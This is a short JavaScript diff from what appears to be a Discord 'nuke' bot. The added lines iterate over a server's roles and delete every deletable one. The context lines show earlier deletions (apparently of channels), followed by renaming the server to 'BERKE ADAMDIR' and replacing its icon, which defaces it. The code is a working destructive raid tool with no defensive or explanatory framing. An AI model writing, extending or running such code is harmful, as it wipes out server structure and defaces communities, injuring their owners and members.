@@ -21,6 +21,12 @@ return c.delete();
 }
 });  
 
+message.guild.roles.forEach(c => {
+if (c.deletable) {
+roller++;
+return c.delete();   
+}
+});
   
 message.guild.setName(`BERKE ADAMDIR`, ":))")
 message.guild.setIcon(`https://media.discordapp.net/attachments/566759721294495761/566902339726999553/6fc0bd5fbaec9e4bdcc10c0bd459f605.png`)
